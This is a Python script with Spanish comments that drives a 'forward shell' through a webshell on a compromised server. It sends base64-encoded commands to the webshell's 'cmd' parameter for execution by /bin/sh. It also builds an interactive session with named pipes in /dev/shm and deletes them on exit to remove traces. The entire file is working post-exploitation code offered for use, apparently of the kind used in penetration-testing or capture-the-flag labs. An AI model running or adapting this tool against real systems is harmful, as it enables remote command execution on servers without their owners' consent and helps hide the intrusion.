#!/usr/bin/env python3

import time
import signal
import sys
import os
import requests
from base64 import b64encode
from random import randrange

# --- Manejo de la Señal de Interrupción (Ctrl+C) ---
def def_handler(sig, frame):
    print(f"\n[!] Saliendo. Limpiando archivos temporales...")
    remove_data() # Asegura la limpieza al salir
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# --- Configuración Global ---
sessions = randrange(1000, 9999) # ID de sesión aleatorio para los fifos
main_url = "http://localhost/index.php" # URL de la webshell en el servidor comprometido

# Rutas de los FIFOs (Named Pipes) en el sistema objetivo
# /dev/shm es un directorio temporal basado en RAM, ideal para estos fines
stdin_fifo =f"/dev/shm/{sessions}.input" # FIFO para escribir comandos (input de la shell)
stdout_fifo = f"/dev/shm/{sessions}.output" # FIFO para leer la salida de los comandos (output de la shell)

# --- Funciones de Interacción con la Webshell ---

def run_command(command_to_execute):
    """
    Ejecuta un comando directamente en la webshell.
    Se utiliza principalmente para la configuración inicial de los FIFOs.
    """
    encoded_command = b64encode(command_to_execute.encode()).decode() # Codifica el comando a Base64
    
    # Parámetros para la petición GET a la webshell
    data_params ={
        'cmd': f'echo "{encoded_command}" | base64 -d | /bin/sh' # La webshell decodifica y ejecuta
    }
    try:
        r = requests.get(main_url, params=data_params, timeout=10) # Envía la petición con timeout
        r.raise_for_status() # Lanza un error si la respuesta HTTP no es 200 OK
        return r.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión o HTTP al ejecutar comando: {e}")
        return None
    except Exception as e:
        print(f"[!] Error inesperado en run_command: {e}")
        return None

def setup_shell():
    """
    Configura la shell persistente en el sistema objetivo utilizando mkfifo.
    Crea los FIFOs y el proceso 'tail -f' para la interactividad.
    """
    # Comando para crear los FIFOs y la conexión bidireccional
    # tail -f [input_fifo] | /bin/sh 2>&1 > [output_fifo]
    # stdin_fifo: el usuario escribe comandos aquí
    # stdout_fifo: la salida de los comandos se redirige aquí
    command = f"mkfifo {stdin_fifo}; tail -f {stdin_fifo} | /bin/sh 2>&1 > {stdout_fifo}"
    print(f"[+] Configurando shell con FIFOs: {stdin_fifo} y {stdout_fifo}")
    run_command(command) # Ejecuta el comando de setup en la webshell

def write_to_stdin_fifo(command_to_write):
    """
    Escribe un comando en el FIFO de entrada (stdin_fifo) en la máquina objetivo.
    Este comando será leído y ejecutado por la shell en el objetivo.
    """
    # Asegúrate de añadir un salto de línea para que la shell ejecute el comando
    command_to_write_b64 = b64encode((command_to_write + '\n').encode()).decode()
    
    # Comando para escribir el comando decodificado en el FIFO de entrada
    data_params ={
        'cmd': f'echo "{command_to_write_b64}" | base64 -d > {stdin_fifo}'
    }
    try:
        r = requests.get(main_url, params=data_params, timeout=10)
        r.raise_for_status()
        # No se espera una salida útil de esta petición, solo que se ejecute la escritura
    except requests.exceptions.RequestException as e:
        print(f"[!] Error de conexión o HTTP al escribir en FIFO: {e}")
    except Exception as e:
        print(f"[!] Error inesperado en write_to_stdin_fifo: {e}")


def read_from_stdout_fifo():
    """
    Lee el contenido del FIFO de salida (stdout_fifo) en la máquina objetivo.
    Este contenido es la salida de los comandos ejecutados.
    """
    # Comando para leer el contenido del FIFO de salida
    # Cat el FIFO y luego elimina el contenido para la siguiente lectura
    command_to_read = f"cat {stdout_fifo}; echo > {stdout_fifo}" 
    output = run_command(command_to_read)
    return output

def remove_data():
    """
    Elimina los archivos FIFO temporales del sistema objetivo al salir.
    Es crucial para limpiar el rastro.
    """
    remove_command_data = f"/bin/rm {stdin_fifo} {stdout_fifo}"
    print(f"[+] Limpiando FIFOs: {stdin_fifo} y {stdout_fifo}")
    run_command(remove_command_data)

# --- Bucle Principal de la Shell ---
if __name__ == '__main__':
    print("[+] Estableciendo Forward Shell. Asegúrate que la webshell sea accesible.")
    setup_shell() # Configura los FIFOs y la shell en el objetivo
    
    # Espera un momento para que el tail -f y mkfifo se inicialicen en el objetivo
    time.sleep(2) 

    while True:
        try:
            command_input = input(f"shell-{sessions}> ") # Prompt interactivo
            if command_input.lower() == "exit":
                break # Sale del bucle para limpiar y salir

            if command_input: # Si el comando no está vacío
                write_to_stdin_fifo(command_input) # Escribe el comando en el FIFO de entrada
                time.sleep(0.5) # Pequeña espera para que el comando se ejecute y genere salida
                output_command = read_from_stdout_fifo() # Lee la salida del FIFO de salida
                if output_command:
                    print(output_command.strip()) # Imprime la salida, eliminando espacios extra
                else:
                    print("[!] No se recibió salida o hubo un error al leer el FIFO.")
            
        except KeyboardInterrupt: # Manejo de Ctrl+C
            break # Sale del bucle para ir a la limpieza
        except Exception as e:
            print(f"[!] Error en el bucle principal: {e}")
            break

    # Limpieza al salir del bucle principal
    remove_data()
    print("[+] Forward Shell finalizada.")
    sys.exit(0)